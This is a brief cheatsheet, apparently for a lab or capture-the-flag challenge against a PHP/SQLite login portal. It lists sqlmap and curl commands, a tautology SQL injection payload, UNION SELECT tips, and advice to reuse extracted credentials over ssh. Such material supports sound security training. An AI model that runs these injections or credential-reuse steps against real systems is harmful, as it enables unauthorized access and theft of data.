# Cheatsheet — Trusting Query

## Targets

- **sqli01** — apache + php + sqlite portal (`/` login, `/user.php` lookup)

## Useful commands

```bash
curl -s -c c.txt -d 'username=<u>&password=<p>' http://<ip>/
sqlmap -u 'http://<ip>/' --forms --batch
curl -s 'http://<ip>/user.php?u=<username>'
ssh webdev@<ip>
```

## Concepts

- Tautology injection (`' OR '1'='1' -- `) neutralizes `AND password='x'`
- `UNION SELECT` needs the SAME column count — pad with NULLs if unsure
- A rendered result set is an exfiltration channel; a boolean login is not
- Credentials in application tables are usually reused somewhere — try ssh
